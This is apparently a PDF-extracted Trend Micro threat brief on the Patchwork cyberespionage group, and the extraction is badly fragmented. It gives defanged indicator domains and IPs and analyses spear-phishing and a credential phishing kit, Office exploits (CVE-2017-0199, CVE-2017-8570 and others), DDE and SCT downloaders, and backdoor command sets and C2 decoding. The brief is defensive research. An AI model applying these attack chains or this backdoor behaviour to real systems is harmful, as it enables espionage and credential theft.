\nhxxp://\nqzonecn[.]com\n \nhxxp://\nrandreports[.]org\n \nhxxp://\nrannd[.]org\n \nhxxp://\nscitechtrends[.]com\n \nhxxp://\nservicelogin[.]center\n \nhxxp://\nservicelogin[.]support\n \nhxxp://\nsinamilblog[\n-\n]cn[.]org\n \nhxxp://\nsinamilnews[.]com\n \n  \n \n \n \n \nDomain/\nURL\n \nh\nxx\np://sinodefence\n[.]\ni\nnfo\n \nhxxp://\nstripshowsclub[.]com\n \nhxxp://\ntecchweb[.]com\n \nhxxp://\ntiexue[\n-\n]cn[.]net\n \nhxxp://\nustc[\n-\n]cn[.]org\n \nhxxp://\nyahoomail[.]support\n \nhxxp://\nzhiihua[.]org\n \nhxxp://\nzhouangjiabing[.]com\n \nIP Address\n \n93[.]115[.]94[.]202\n \n94[.]185[.]82[.]155\n \n94[.]242[.]249[.]203\n \n179[.]48[.]251[.]4\n \n209[.]58[.]183[.]33\n \n176[.]107[.]177[.]10[\n:\n]23558\n \n \n \n \n \n5[.]101[.]140[.]220\n \n209[.]58[.]163[.]44\n \n46[.]166[.]163[.]243\n \n5[.]8[.]88[.]64\n \n \n \n \n  \n \n \n \n \n \n \n \n \n \n \n \n \n \n \nTrend Micro \nIncorporated, a global leader in security software, strives to make the \nworld safe for exchanging digital information. Our innovative solutions for consumers, \nbusinesses and governments provide layered content security to protect information \non mobile devi\nces, endpoints, gateways, servers and the cloud. All of our solutions \nare powered by cloud\n-\n\n\nglobe. For more information, \nvisit\n \nwww.trendmicro.com\n. \n \n\u00a9201\n7\n \nby Trend Micro, Incorporated. All rights reserved. Trend Micro and the Trend \nMicro t\n-\nball logo are trademarks or registered trademarks of Trend Micro, \nIncorporated. All other product or company names may be trademarks or registered \ntrademarks of their own\ners.\n \n ", "Trend\nLabs\n \n \n \n \n \n TREND MICRO LEGAL DISCLAIMER\n \nThe information provided herein is for general information and educational purposes only. It is not intended and should not b\ne construed to constitute legal \nadvice. The information contained herein may not be applicable to all situations and may not reflec\nt the most current situation. Nothing contained herein should \nbe relied on or acted upon without the benefit of legal advice based on the particular facts and circumstances presented and \nnothing herein should be construed \notherwise. Trend Micro reserves th\ne right to modify the contents of this document at any time without prior notice.\n \nTranslations of any material into other languages are intended solely as a convenience. Translation accuracy is not guarantee\nd nor implied. If any questions arise \nrelated to \nthe accuracy of a translation, please refer to the original language official version of the document. Any discrepancies or d\nifferences created in the \ntranslation are not binding and have no legal effect for compliance or enforcement purposes.\n \nAlthough Tr\nend Micro uses reasonable efforts to include accurate and up\n-\nto\n-\ndate information herein, Trend Micro makes no warranties or representations of any \nkind as to its accuracy, currency, or completeness. You agree that access to and use of and reliance on this \ndocument and the content thereof is at your own \nrisk. Trend Micro disclaims all warranties of any kind, express or implied. Neither Trend Micro nor any party involved in cre\nating, producing, or delivering this \ndocument shall be liable for any consequence, \nloss, or damage, including direct, indirect, special, consequential, loss of business profits, or special damages, \nwhatsoever arising out of access to, use of, or inability to use, or in connection with the use of this document, or any erro\nrs or omissions \nin the content thereof. \n\n \n \n \n \n \n \nTable of Contents\n \nInfection Vectors\n \n................................\n................................\n................................\n................................\n...........\n \n2\n \nSpear\n-\nphishing Emails\n \n................................\n................................\n................................\n................................\n...............\n \n2\n \nWebsite \nRedirects\n \n................................\n................................\n................................\n................................\n.....................\n \n2\n \nDirect Links\n \n................................\n................................\n................................\n................................\n................................\n \n3\n \nMalicious Attachments\n \n................................\n................................\n................................\n................................\n..............\n \n3\n \nMail Sending Method\n \n................................\n................................\n................................\n................................\n................\n \n3\n \nDrive\n-\nby Download\n \n................................\n................................\n................................\n................................\n....................\n \n3\n \nPhishing\n \n................................\n................................\n................................\n................................\n................................\n.....\n \n3\n \nSocial Engineering and Weaponized Documents\n................................\n................................\n.........................\n \n7\n \nDownloaders\n \n................................\n................................\n................................\n................................\n...............\n \n10\n \nSimple Downloaders\n \n................................\n................................\n................................\n................................\n................\n \n10\n \nDDE Downlo\nader\n \n................................\n................................\n................................\n................................\n.....................\n \n12\n \nPayloads\n................................\n................................\n................................\n................................\n......................\n \n12\n \nxRAT\n \n................................\n................................\n................................\n................................\n................................\n........\n \n12\n \nNDiskMonitor\n \n................................\n................................\n................................\n................................\n...........................\n \n13\n \nSocksbot\n \n................................\n................................\n................................\n................................\n................................\n.\n \n14\n \nBadnews Backdoor\n \n................................\n................................\n................................\n................................\n.................\n \n16\n \nFile Stealers\n \n................................\n................................\n................................\n................................\n.................\n \n19\n \nTaskhost Stealer\n \n................................\n................................\n................................\n................................\n......................\n \n19\n \nWintel Stealer\n \n................................\n................................\n................................\n................................\n..........................\n \n23\n \nAutoIt Stealer\n \n................................\n................................\n................................\n................................\n...........................\n \n24\n \nInfrastructure\n \n................................\n................................\n................................\n................................\n...............\n \n25\n \nPractice Defense in Depth\n \n................................\n................................\n................................\n..........................\n \n26\n \n \n \n  \n \n \n \n \nPatchwork\n \n(also known as Dropping Elephant) is a cyberespionage group whose targets included \ndiplomatic and government agencies\n \nas well as businesses\n. Patchwork is known for rehashing off\n-\nthe\n-\nrack tools and malware for its \nown\n \ncampaigns. The \ngroup uses \nattack vectors \nthat \nmay not be \ngroundbreaking\n\nwhat with other groups exploiting \nzero\n-\ndays\n \nor cunningly \nadjusting their tactics\n\nbut \nas its moniker entails, its repertoire of infection vectors and payloads still mak\nes them a credible threat.\n \n\nin 2017\n. The diversity of their \nmethods \nis notable\n\nfrom the social engineering hooks, attack chains, and backdoors they deployed. They\n \nalso \nincluded \nDynamic Data Exchange\n \n(DDE) and \nWindows Script Component\n \n(SCT)\n \nabuse\n \nto their tactics\n, as \n\nother threats and security flaws\n \nt\no \nrepurpose for their own\n \nends\n. \nAlso\n \nof note are its attempts to be more \ncautious and efficient in their operations. \n \nThis technical brief provides deeper analyses of their campaigns\n\nfrom the infection vectors\n \nand \nsocial \nengineering\n \nto the \ninfrastructure\n \na\nnd malware they used.\n \nThe indicators of compromise are in this \nappendix\n.\n \n \nSpear\n-\nphishing emails are \ntheir\n \nstaple method \nfor \ndeliver\ning\n \nmalware. These socially engineered emails \ncontain web links of weaponized documents containing exploits or macros. \nWe found \nPatchwork\n \nusing \nthree variations of this method.\n \n \nPatchwork set up an English\n-\nl\nanguage news site. The spoofed website looks exactly like the legitimate \n\nthe \naddition of a \nsmall code snippet. \nIt \ncontains \nan \nadditional meta tag at the end of the web p\nage source code, \n\n \nThe web page \nis not indexed\n \nin search engines. It can only \nbe visited\n \nby clicking on the link contained in \nthe spear\n-\nphishing email\ns, helping it \nevade traditional \nsecurity mechanisms compared to directly \nsending the link to the malicious document.\n \n \nFigure 1: The \nadded\n \ncode snippet \nthat \nredirect\ns\n \nits visitors to the malicious document\n \n \n \n  \n \n \n \n \nWe also saw spear\n-\nphishing emails containing direct links to the wea\nponized documents hosted \no\nn \nservers they own. \nThe group \nemploy\ns\n \ntyposquatting t\no increase \nclicks\n. T\nhese servers were reached \nthrough domain names similar to legitimate websites, such as rannd[.]org instead of rand.org.\n \n \nThe malicious \n\nused as much, as \nthe attachments can be detected by spam filters\n.\n \n \nThe spear\n-\nphishing emails \nwere sometimes sent\n \nto victims by misusing \nYMLP\n \nand serversecure.net, \nwhich are email/newsletter distribution services. Abusing these legitimate online services helps improve \n\n \n\nng emails using a Postfix server\n \nthey\n \noperate\n. The domain name \n\nto \nthis server. It had a proper MX record, \nan\n \nSSL certificate issued by \n\n, and the domain property validate\nd \non \nGoogle\n. Recently, the TXT SPF1 record of domains \n\nservicelogin\n.\ncenter\n\nspam filters.\n \n \nThe attacker\ns also \nreporte\ndly\n \nused a fake Youku Tudou website (a video platform similar to YouTube \nvery popular in China). It entices users to download a fake Adobe Flash player update, which turned out \nto be \na variant of the \nxRAT\n \nmalware.\n \n \nThe group \nalso employ\ns\n \n\nand \nother \nonline services.\n \n\nOpening one \nof \nthe \nsuspicious\n \ndomains\n,\n \nhxxps\n://accounts\n[\n-\n]\nlogin\n[\n-\n]\nsecure\n[\n.\n]\n163\n[\n.\n]\ncom\n[\n.\n]\nneteease\n[\n.\n]\ncom\n, \nin a web \nbrowser\n \nreturns \n\n \na web development company.\n \n  \n \n \n \n \n \n\n                                                                  \nwas copied\n \nfrom \na web development company\n \nA closer look reveals \nthat the phishing kit expects a few parameters. The \nkit\n,\n \nwhich spoofs a legitimate \nweb portal and email service, \nconsists of two PHP files: \nmain.php\n, which has the initial webpage; and \nerror.php\n,\n \nwhich harvests and processes entered credentials. \n \n \nFigure 3: The PHP file that processes entered credentials\n \n  \n \n \n \n \nmain.php\n \nexpects the following commands with base64\n-\nencoded values (\nseen \non\n \nthe screenshot \nabove):\n \nu = user (encoded \nusername\n, the victim cannot change it \no\nn the web form)\n \nr = referrer (\nhxxp\n://mial\n[\n.\n]\n163\n[\n.\n]\ncom\n \nwas used\n \nas referrer\n; the use of \n\nmial\n\n\n \nis noted\n)\n \nd = domain (163 or 126 or yeah or \nshouji\n)\n \nThe domain has one of the four possible values:\n \nMTYz\n \nis 163\n \nMTI2\n \nis 126\n \neWVhaA== is yeah\n \nc2hvdWpp  \nis \nshouji\n \n(which means mobile phone in Chinese)\n \n \nAs of November 24, 2017, we found thre\ne different phishing websites\n \nusing a valid SSL certificate issued \n\n\n \nThe SSL certificates \nlisted the \nfollowing domain names: \n \n\n \naccounts\n[\n-\n]\nlogin\n[\n-\n]\ns\necure[\n-\n]163\n \n[\n-\n]com[\n-\n]neteease.com\n \n\n \na\nccounts\n[\n-\n]\nlogin\n[\n-\n]secure[\n-\n]qq[\n-\n]com[\n-\n]neteease.com\n \n\n \naccounts\n[\n-\n]\nlogin\n[\n-\n]vip[\n-\n]sina[\n-\n]com[\n-\n]neteease[\n-\n]com\n \n\n \nneteease\n[\n.\n]\ncom\n \n\n \naccoun\nts[.]login[.]yahoomail[.]support\n \n\n \nyahoomail\n[.]\nsupport\n \n\n \naccounts\n[.]\nlogin\n[.]\ngooglemail\n[.]\nsupport\n \n  \n \n \n \n \n \nFigure 4: Page information \nproperties of one of the phishing websites\n \nThe parameters sent to the \nerror.php\n \nscript that attackers collect are username, domain, password and \nredirector values.\n \n \nFigure 5: Parameters sent to the error.php script\n \nGiven how the phishing kit works, the at\ntackers seem cautious. The phishing page can only \nbe obtained\n \nby sending specific arguments to the PHP script. Any other way will lead to the fake suspended account \npage. The link leading to the phishing page \ncan only \nbe found\n \non the emails sent to the \nvic\ntims.\n \n \n  \n \n \n \n \nMany of the documents were \nfound \ni\nn\n \na directory \naccidentally \nleft open. \nThe group use\ns\n \ns\nociopolitical \nthemes \nas \nsocial engineering hooks. Those with the .doc extension are \nactually\n \nRich Text format (RTF) \nfiles that trigger an exploit for \nCVE\n-\n2012\n-\n1856\n, patched via \nMS12\n-\n060\n \nlast August 2012. It is a remote \ncode execution (RCE) vulnerability in the Windows common control \nMSCOMCTL\n, an ActiveX Control \nmodule. These files drop\n \nvariants of the \nNDiskMonitor\n \nbackdoor. The PowerPoint Open XML Slide Show \n(PPSX) files exploit Sandworm (\nC\nVE\n-\n2014\n-\n4114\n\nObject Linking and \nEmbedding\n \n(OLE) feature patched last October 2014.\n \n \nFigure 6: The dir\nectory containing the documents\n \nThe PowerPoint (PPT) file exploit\ns\n \nCVE\n-\n2017\n-\n0199\n, \n\n\n\n \nthe file will attempt to download \nan .\nHT\nA file and silently exploits it by leveraging \nCVE\n-\n2017\n-\n0199\n.\n \n \nFigure 7: The PPT containing the CVE\n-\n2017\n-\n0199 exploit\n \n  \n \n \n \n \n \nFigure 8: Code \nsnapshot\n \nshowing the PPT file downloading a \nmalicious .\nHTA file\n \nWe also saw another document that \ncomes with \nan executabl\ne \ninstead of a macro\n. \nThe file \ndecodes and \nexecutes a Visual Basic script (VBS)\n \nthat \ndrops and executes a hybrid batch/.NET file\n,\n \nwhich \nthen \ndownloads and executes the \nNDiskMonitor\n \nbackdoor and a decoy document. The relatively long \ninfection chain can \nbe \nconstrued\n \nas their way to obscure their activities. \n \nA\n \nd\nocument\n \nthe\n \ngroup \nrecently used\n \nhad \nan additional step, likely \ndone \nto avoid antivirus (AV) detection. \nA Word document embed\nded with\n \na malicious PPSX file\n \nurges \nthe victim \nto click on \na fake PDF icon \nto \nopen the malicious document. \nIt exploits\n \nCVE\n-\n2017\n-\n8570\n \n(an RCE\n \nvulnerability\n \nin Microsoft Office \npatched last July 2017)\n \nto download a\n \nWindows Script Compon\nent (\nSCT\n)\n \nfile from\n \na Patchwork\n-\nowned \nserver.\n \n \nFigure \n9\n: \nScreenshot of t\nhe Word document containing a PPSX file that exploits CVE\n-\n2017\n-\n8570\n \n  \n \n \n \n \n \nFigure \n10\n: Code snippet showing the malicious SCT to be retrieved\n \nT\nhe \nscriptlet \n.\nSCT\n \nfile \nshown above \ncontains PowerShell code. The payload downloads a malicious \nxRAT sample and a \ndecoy \nPowerPoint \npresentation\n. It also \nrecursively deletes \nResiliency\n \nregistry keys \ncreated by Microsoft Office applications (Word, Excel, PowerPoint, etc.). Some items in \nthe \nRe\nsiliency\n \nregistry key \nare created\n \nwhen the Office application does not terminate correctly, later\n \ndisplaying \nthis \ninformation to the user. Deleting \nResiliency\n \nkeys will make the Office application think that everything \nwas correct and there were no problem\ns during the latest application run. The latest step \ninvolves \nstarting PowerPoint, \nmaximizing \nits window, and load\ning\n \na decoy document while starting the payload in \nthe background. \nWe also found other PPSX documents that exploited this \nvulnerability\n,\n \nbut t\nhey were \nsent directly\n \nand\n \nnot embedded in a DOCX file.\n \nWe also uncovered documents related to the Bangladesh Army and \na \nUnited Nations Development \nProgramme in Sri Lanka. These documents contained malicious macros that deliver the xRAT remote \naccess tool,\n \nwhich lets attackers control the infected machine. \n \nThere were also other \nsocial\nly\n \nengineered \ndocuments \nthat used \ngovernment\n-\nrelated news and activities, \nwith subjects \n\n\n \nas lures\n. These are RTF files exploiting \nCVE\n-\n2015\n-\n1641\n, a memory corruption vulnerability in Microsoft Office patched last April 2015. \nWhen executed, i\nt \ndrops a signed \njava\n-\nrmi.exe\n \nexecutable from Java Runtime and two dynamic\n-\nlink libraries (DLLs)\n\na \nclean \nmsvcr71.dll\n \nand malicious \njli.dll\n. The malicious DLL, which contains the \nBadnews\n \nbackdoor, is \nloaded and executed using \nthe \nDLL side\n-\nloading technique\n. \n \n \n \n  \n \n \n \n \n \n \nFigure \n11\n: \nS\ncreen\nshots \nof RTF files that exploit CVE\n-\n2015\n-\n1641 and deliver the \nBadnews\n \nbackdoor\n \n \nWe managed to acquire a few samples abusing a technique called \ns\nelf\n-\ncompiled .NET hybrids\n. One text \nfile contains both JavaScript code and batch code, which compiles the JavaScript code into\n \nexecutable \nfiles and later executes it.\n \nThe file starts with two lines\n, shown below\n. The first line must be a valid statement in both languages. If \nexecuted as a batch script, the first comparison (@X)==(@Y) \nis evaluated\n \nas \nFalse\n. T\nherefore\n \n@end is not \nexecuted. \nE\nach following line is \nthen \n\ncauses the batch processing\n \nto terminate\n.\n \n  \n \n \n \n \n \nFigure \n12\n: Code snippet \nof samples\n \nus\ning\n \nthe self\n-\ncompiled .NET hybrid\n \nJavaScript, however, tre\nats terms starting with @ as \nconditional compilation variables\n, evaluated as \nFalse, followed by a multiline comment. \nJavaScript \n,\n \ntherefore, \nignores all the code between /* a\nnd */, \nand only the code that follows */ \nis considered\n.\n \nThe compilation process \nis achieved\n \nby the following command, where %jsc% points to a \nJScript\n \ncompiler and \n%~\ndpsfnx0 \nis\n \nresolved\n \nto the name of the currently executed batch file (d means \ndisc\n, p \nmeans path, f m\neans file, x means extension\n;\n \nall \nare\n \nmodifiers of a special %0 parameter)\n.\n \n \nFigure \n13\n: Command that facilitates the compilation process\n \nThe end of the batch script behind the */ comment \nis treated\n \nas source code. The code shown below \nmakes a simple command\n-\nline downloader with two parameters, URL, and file name.\n \n \nFigure \n14\n: Snapshot showing the command\n-\nline downloader\n \nAfter compilation, t\nhe batch script uses the previously compiled \nsimpledownloader.exe\n \nto download and \nexecute both the payload and decoy document.\n \n \n \n  \n \n \n \n \n \nFigure \n15\n: Snapshot showing the payload and decoy document \nbeing retrieved\n \nThe \nscvhost6.exe\n \nfile is \nactually\n \na variant of the\n \nNDiskMonitor\n \nbackdoor, while the document.doc is a \ndecoy document, which is a legitimate sociopolitical essay.\n \n \nPatchwork also \nabused \nthe \nDynamic Data Exchange\n \n(DDE) protocol to deliver their malware. The internal \nstructure of a sample we analyzed, an Office Open XML file, is a ZIP archive\n \nthat \ncontains the \n\nxml\n\n \nThe payload starts with a DDEAUTO string, followed by a command to be executed. The command can \nbe split\n \n\nw:instrText\n\nthrough the use of \nother\n \nmethods\n. In the figure below, the \nentire PowerShell command \n(\ndisplayed in black\n)\n \nis split\n \ninto several chunks. When a victim opens the \ndocument and DDE is enabled on the machine, the PowerShell command downloads and displays the \ndecoy \ndocu\nment\n \nthen retrieves and executes xRAT.\n \n \nFigure \n16\n: PowerShell command retrieving and executing xRAT\n \n \nxRAT,\n \nrenamed\n \nQuasarRAT\n \nin its latest versions,\n \nis a remote access tool whose source is publicly \navailable on Github. This \navailability allows \nanyone \nto \neasily clone the project and compile it. The project \nis actively maintained\n,\n \nwith users reporting bugs and the developer fixing them and committing the \nrepaired files back to the Github repository.\n \n  \n \n \n \n \nNDiskMonitor is\n \na \ncustom \nbackdoor written \nin\n \n.NET, named after the project name.\n \n\n\n \n \nFigure \n17\n\n \n\nconfiguration \nis \nstored\n \nin \nupdate_details\n \nglobal variable. 70600 is probably \nits b\nackdoor \nID, \n\"\nF\nuck\nYou\n\"\n \nis\n \nthe \nAES password used \nfor \nencrypti\nng \ncertain information, \nand the string following it is \nthe command and control (C&C) \naddress.\n \n \nFigure \n18\n\nion\n \nNDiskMonitor spawns \na few threads. The first thread beaco\nns \nregular\nly \nto let attackers know that the \nmachine is alive. \nThe p\narameter \nlicense\n \nis \nthe \nencrypted \nusername\n, \ncurrent_license\n \nis \nthe \nencrypted \ncomputer name,\n \nand\n \nbui\n \nis \nthe \nbackdoor ID.\n \n \nFigure\n \n19\n: Thread spawned by \nNDiskMonitor\n \n \n \n  \n \n \n \n \nThe second thread listens for backdoor commands. Backdoor queries\n \nare done via\n \nupdatecheck.php\n,\n \nwith parameters \nclient\n \nas \nthe \nencrypted user name. Supported commands are:\n \ncme\n-\nupdate|<base64 \ncommand>\n \nexecute command, \nAES\n-\nencrypted result \nexfiltrated \nwith\n \n/php/component_update.php\n, \nparameters \ncomponent\n \n= user name and \ncheck\n \n= \nencrypted result\n \nD\nv\n \nreturn list of all logical drives, separated \nby\n \n\n&\n\n \nrr|<base64 directory>\n \nlist all the files and directories in given \ndirectory\n \nue|<base64 url>\n \ndownload and execute file from given \nURL\n \nThe third thread regularly downloads \nand executes the \nWintel \nfile/information \nstealer\n, while t\nhe fourth \nthread \nruns \na custom Task Host \nprogram\n\n, wh\nich \n\none on its own. \n \nOf note were multiple NDiskmonitor samples we found in the wild that had different hashes but \nsimilar \ncode. The attackers \nadded \nfour extra bytes of random uppercase and lowercase letters after the PE\n-\nreferenced data in the\n \noverlay. We think this is done solely to change the file \nhashes\n \nsince the Windows \nPE loader won't even load \nthose extra bytes \nin\nto\n \nmemory. \n \nPatchwork also uses the Socksbot backdoor. As its name suggests, it abuses Socket Secure (SOCKS) \nproxies.\n \n \n \n \nFigure \n20\n: Snapshot showing \nS\nocksbot\n \nAll Socksbot binaries are DLL files\n \nthat create a suspended \nsvchost\n \nprocess, in which the DLL \nis \ninjected\n \nand then executed \n(e.g., as a module in another backdoor). When Socksbot communicates with \nthe C&\nC server, the response will \ninclude\n \na status code. \n \n \n \n  \n \n \n \n \nBased on the status code, Socksbot will execute one of the following branches:\n \n\n \n200\n: \nstart a \nSOCKS\n \nproxy thread\n \n\n \n202: take a screenshot and list of all running processes to C&C\n \n\n \n203: activate the backdoor \nfunction, which depends on the first byte of received and decoded \nbuffer, which can be:\n \no\n \nWrite and execute an EXE file\n \no\n \nWrite and execute \na \nPowerShell script\n \no\n \nWrite and execute \na \nPowerShell script and exit\n \n \n \n \nFigure \n21\n: Code snippets showing Socksbot execut\ning branches based on status code\n \n  \n \n \n \n \nThis backdoor, which has \nbeen used\n \nin\n \nother\n \ncampaigns\n, has an interesting method for retrieving the \nactual C&C address. The binary has a few hardcoded and encoded URL addresses, which can \nb\ne \ndecoded\n \nby subtracting 0x01 from each character. \n \nAfter the decoding, we get the actual \nURL\ns\n.\n \n \n \nFigure \n22\n: The hardcoded strings (above), and the actual URLs when decoded (below)\n \n \nThese addresses refer to legitimate websites such as Github, Feed43, Web\nRSS, Wordpress, and Weebly, \nlikely to circumvent AV detection. Accessing these decoded URLs reveals a long base64 string enclosed \nwithin parentheses.\n \nThis\n \nmay be hidden on some websites, as the text has white color on a white \n\n \nto\n \n\n \n \n \n  \n \n \n \n \n \n \n \nFigure \n23\n: base64 string enclosed in the decoded URLs\n \n\n \nThe text needs to \nbe decoded\n \non \nthe actual C&C server. \nThis\n \ncan be done by base64 decoding, \ndecoding Hex string to bytes, then XORing each byte with 0x23 and rotating left by \nthree\n \npositions. The \ndecoded C&C URL looks like the following: \nhxxp\n://188\n[\n.\n]\n165\n[\n.\n]\n124\n[\n.\n]\n30/c6afebaa8acd80e7/byuehf8af\n[\n.\n]\nphp\n \nBadnews\n \nwill then start to communicate with the C&C server. The request is not sent in clear text form, \nbut is encoded using the same algorithm used for encoding the C&C server name:\n \nuid=<14 hex digits >&u=<hex encoded Unicode username>&c=<hex encoded Unicode com\nputer \nname>&v=2.2\n \n \n \n \n  \n \n \n \n \nThe server response may include any of these 11 implemented commands:\n \n\n \ns\nhell\n\nd\nownload and save file\n \n\n \nl\nink\n\ndownload and write \nfile\n, \nrun with ShellExecute\n, inject into \nprocess\n \nif writing to file fails\n \n\n \nmod\n\ndownload and save DLL file; likely\n \nmodule\n \n\n \nupd\n\ndownload and save EXE file; likely update\n \n\n \ndwd\n\ncreate \nempty\n \nfile and send it to C&C server; probably for testing purposes\n \n\n \nkl\n\nsend logged keys to C&C server\n \n\n \nsnp\n\nsnap, take \nscreenshot\n \n\n \nustr\n\nupload stolen documents\n \n\n \nsdwl\n\nupload file to C&C server\n \n\n \nutop\n\nstop stealing files\n \n\n \nhcmd\n\nrun cmd.exe as a shell\n \n \nFigure \n24\n: \nBadnews\n\n \n \n  \n \n \n \n \nDepending on \nBadnews\n\nin a file, which, based on the received backdoor command, may \nbe sent back to C&C server. The same \ngoes for the file\n-\nstealing thread, which monitors USB devices and copies files with certain extensions to \n\nback to C&C \nserver. This feature \nis probably implemented\n \nto overcome air\n-\ngapped environments, as not\n \nall\n \nof its versions have a thread\n \nthat steals data stored on USB devices\n. \nBadnews\n \nis \nusually \ncompiled as \na DLL loaded by a legitimate Java runtime executable, which is\n \nvulnerable to DLL hijacking. \nT\nhe real \nAuthenticode certificate is \nsometimes \nappended to the DLL to make it look more legitimate, but it is \ninvalid.\n \nWe recently saw a sample of it as an executable in the wild.\n \n \n\nile steal\ner\ns\n \nare used to \nsearch\n \nfor \nfiles with certain extensions\n, which \nare then \nuploaded\n \nto\n \ntheir\n \nC&C server. \nThe stealers we found seem to be developed and used exclusively by \nPatchwork.\n \n \nTaskhost Stealer\n \ncombines theft and persistence capabilities. \nIt\n\ns written in .NET and obfuscated with\n \nCrypto Obfuscator, which can \nbe removed\n \nwith \nthe \nde4dot tool.\n \n \nFigure \n25\n\n \n  \n \n \n \n \nTaskhost Stealer has \na constructor of a class, where\n \nthe\n \nbase.Load\n \nfunction is assigned an important \nfunction called \nRemoveResources\n. \nThe \nIP address of C&C server \nis also assigned\n \nto a vari\nab\nle named \nwindowID\n. \nNote that \nfunction names \n\nrelation to their actual function, e.g.\n,\n \nRemoveResources\n \n\nt \nmean that it \n\nremoves resources\n\n \nThe fake names were probably made to \nconfuse \nreverse engineers\n \nand researchers\n. \n \n \nFigure \n26\n: Code snapshot showing \nRemoveResources\n \nWithin\n \nthe\n \nRemoveResources\n \nfunction \nis \na list of document extensions \nthat are of \ninteres\nt to \nPatchwork\n, \n \nwhich are \nfiles \ncommonly associated with cyberespionage. It also has a\n \nfunction \nthat \nchecks \nfor \nthe \nexistence of \na \nsys.bin\n \nfile in \n%APPDATA\n\\\nRoaming\n\\\nMicrosoft\n\\\ntaskhost\n\\\n1.0.0.0\n\\\n. This file contains \na \nlist of \nall documents with path\ns\n \naccessible from the infected machine.\n \n \nFigure \n27\n: Document extensions specified by Taskhost Stealer\n \nThen, it drops \nMicrosoft.Win32.TaskScheduler.dll\n \nand adds persistence. \nThe c\node\n \nsnippe\nt\n \nbelow shows \nthe \nname of the task (Active Qiho Security),\n \nas well a\ns the\n \ntime\n \ninterval (5 minutes)\n \nand duration (60 days). \nIt means that the process of looking for new files \nrepeats\n \nevery 5 minutes for \nthe \nnext 86\n,\n400 minutes \n(60 days)\n,\n \nbased on the \ncode and scheduled task exported to XML format.\n \n \n \n  \n \n \n \n \n \n \nFigure \n28\n: Code \nsnippet\ns\n \nshowing how Task\nh\nost Stealer looks for new files\n \n(above), which is also in the XML file \nexported from Task Scheduler (below)\n \nIt then enumerates all the available drives and makes a POST request on C&C about \nthe \nexistence of \nthese drives\n:\n \n \nFigure \n29\n: Available drives in the infected machine are enumerated\n \n  \n \n \n \n \nThe request contains parameters \ndrive\n \nand student_name. \ndrive\n\ns value is \na \ndis\nk\n \nletter followed by \ninformation \nif \nit is \na \nFixed or Network drive\n. \nstudent_name\n \ncontains computer\n \nname and username, \n \nseparated by \na \nhyphen.\n \n\nsys.bin.\n \n \n \nFigure \n30\n: POST request with the \ndrive\n \nand \nstudent_name \nparameters\n \n(above) and files \nbeing enumerated\n \n(below)\n \nThe next step is to read from \nhxxp\n://209\n[\n.\n]\n58\n[\n.\n]\n185\n[\n.\n]\n35/LOG/<computer\n \nname>\n-\n<user name>\n[\n.\n]\nhtml\n.\n \nIf \nthe response is c121, the program ends. \nThis\n \nlets attackers control which machines they do not want to \nreceive files \nfrom\n.\n \nAll \nfiles from the previously created list\n \nwill \nbe uploaded\n \none by one\n. A\n \nlist of u\nploaded files \nwill be in \n \ns.dwg\n, \nwhile the \nlist of all files is in \nsys.bin.\n \nDuring each run, \nsys.bin\n \nis deleted\n \nand newly created\n;\n \nhowever, \ns.dwg\n \nremains the same\n. \nThis\n \nensures that only newly created files \nare uploaded\n. The upload \npath looks lik\ne this: drive (Fixed or Network), followed by \npath\n, computer name\n,\n \nand username\n.\n \n \n \n  \n \n \n \n \n \n \nFigure \n31\n: Code snippets showing the c121 response (top) and \ns.dwg\n \n(bottom)\n \n \nWintel \nS\ntealer (Win Telephonic Services) is another .NET stealer named after \nthe \nproject name\n.\n \nCompared to the Taskhost \nS\ntealer, \nW\nintel \nStealer targets different files types and has no persistence \nmechanism\n.\n \nThe information \nof\n \nfiles \nare stored\n \nin the following format\n: \nfilename\n \nwhose \npath is AES\n-\nencrypted with\n \na\n \nhardcoded\n \npassword, \nthen encoded with base64,\n \nwith\n \nthe \n&\n, SHA256\n \nhash\n, and \n$ \ncharacter \nappended. \nThis structure is stored in a global variable and remains in memory. \nA\n \ntimer is enabled\n, starting the \nupload process \nwhen\n \nan\n \ninternet \nconnection \nis available. \n \n \nFigure \n32\n: Winte\n\n \n(right)\n \n  \n \n \n \n \n \nFigure \n33\n: Information about the files \nis stored\n \nin a certain format\n \nThe \nload_check.php\n \nscript \nis first queried\n \nwith \nthe \nparameters \nuser\n, which is base64\n-\nencoded username\n, \nand \nhsh\n, which is file hash. \nThe \n?ussr=\n \nin the screenshot below\n \nis likely a typo\n; it \nshould be \nuser\n \nand not \nussr\n \n(Soviet Union).\n \n \nFigure \n34\n\nload_check.php\n \nscript\n \nQue\nrying this script will tell whether the files \nare of interest and \nshould \nbe upl\noaded\n, and also ensures \nthat \nthe \nbackend\n \nserver\n \n\nup.php\n \nscript \nis \nfor uploading files, \nusing \nparameters \nuse \nfor \nusername, \nfl\n \nfor \nbytes of the file\n, \nhs\n \nfor the SHA256\n.\n \n \n \nOlder versions of \n\n \nfile stealers \nwere written\n \nin AutoIt\n, and e\nach of these contains \nan \nendless \nloop.\n \nThe f\nunction \n__searchindex\n \nsearches drive C:\n\\\n  \nfor certain file extensions. \nThey will \ncop\ny the \ntargeted \nfiles to a directory named \nindex\n. I\nt also maintains a file \nTemp.log\n, \neach line of which\n \ncontain\ning\n \na\n \n\nex\n-\nencoded \nMD\n5\n \nhash\n.\n \nThe f\nunction \n__sendoutlist \nuploads all the files from \nindex\n \ndirectory to \nthe \nC&C\n \nserver\n \nand deletes them.\n \nPersistence is carried out by \nmodifying \nthe \nRun registry key.\n \n \n  \n \n \n \n \n \n \nFigure \n35\n: The \nfunction\ns\n \nof the AutoIt stealers\n \n \nWe found 30 to 40 IP addresses as well as domain names used by Patchwork in 2017. Each server has \na different purpose. Some are only meant to be C&C servers \nthat \ncollect data sent by the file stealers, \nand n\no domain name points to those IP addresses. In some\n \ncases\n, the same server is used for C&C \ncommunication while also acting as a website hosting content copied from legitimate websites and \npropagating malware or weaponized documents. \n \nThey misuse publicly a\nvailable PHP scripts to retrieve files from the server without disclosing their real \n\nfor \ndeter\nring\n \nresearchers from finding \nopen directories. The documents \nare almost always downloaded\n \nfrom\n \nthe \n/\nxinwen\n \ndirectory\n, which is \nnow properly configured and cannot \nbe browsed\n. On multiple occasions, we observed them temporarily \nremoving the file so it could not be retrieved. Sometimes they replaced it with a legitimate file to dupe \nresearchers. In so\n\nresearchers \nin\nto thinking the files are gone.\n \n  \n \n \n \n \nOther servers are used only to host phishing websites. Content change\ns\n \nbetween each campaign, but \nthe same server\n \nremains\n. For instance, the qzonecn[.]com \ndomain\n \nhas been pointing to the same IP \naddress since January 2017, \nbut it now points to \nyahoomail[.]support. It \nreferences \neuuwebmail[.]com \nfor four months, 